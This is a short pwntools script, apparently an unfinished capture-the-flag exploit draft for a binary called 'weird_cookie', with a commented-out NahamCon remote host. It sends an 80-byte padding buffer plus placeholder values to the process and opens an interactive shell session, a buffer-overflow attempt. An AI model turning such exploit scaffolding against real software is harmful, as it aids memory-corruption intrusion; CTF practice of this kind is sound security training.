from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

e = context.binary = ELF('./weird_cookie')
r= e.process()

# r = remote('challenge.nahamcon.com', 32743)

lib = e.libc #   matches my libc

#   lib= ELF('libc6_2.36-0ubuntu4_amd64.so')

f = open('file',"w")
payload=b"".ljust(80,b"a")+flat(0,1,2,3,4)
f.write(payload)

r.sendline(b"file")

r.interactive()
